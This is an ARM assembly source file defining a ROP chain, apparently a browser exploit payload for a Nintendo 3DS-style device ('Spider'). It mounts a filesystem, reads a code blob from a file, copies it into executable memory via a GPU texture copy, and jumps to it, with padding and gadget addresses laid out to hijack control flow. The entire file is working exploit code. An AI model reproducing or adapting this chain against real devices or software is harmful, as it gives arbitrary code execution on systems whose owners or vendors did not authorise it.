	.arm
	.text

#include "rop.h"

#ifndef SPIDER_ARM_CODE_SIZE
	#define SPIDER_ARM_CODE_SIZE 0x00004000
#endif

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ)
	rop_store(THIS+4, SPIDER_ARM_CODE_OFFSET)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
	rop_sleep(1000000000)
	rop_jump_arm
@.org 0x0F4, GARBAGE
	.fill 3, 4, GARBAGE
	.word ROP_LOC+_start+0x8C
@.org 0x128, GARBAGE
	.fill 12, 4, GARBAGE
	.word ROP_LOC+_start, 0, POP_PC
@.org 0x158, GARBAGE
	.fill 9, 4, GARBAGE
	.fill 2, 4, POP_PC
FileName:
	.string16 "dmc:/"
@.org 0x21C, GARBAGE
	.fill 44, 4, GARBAGE
	.word MAGIC
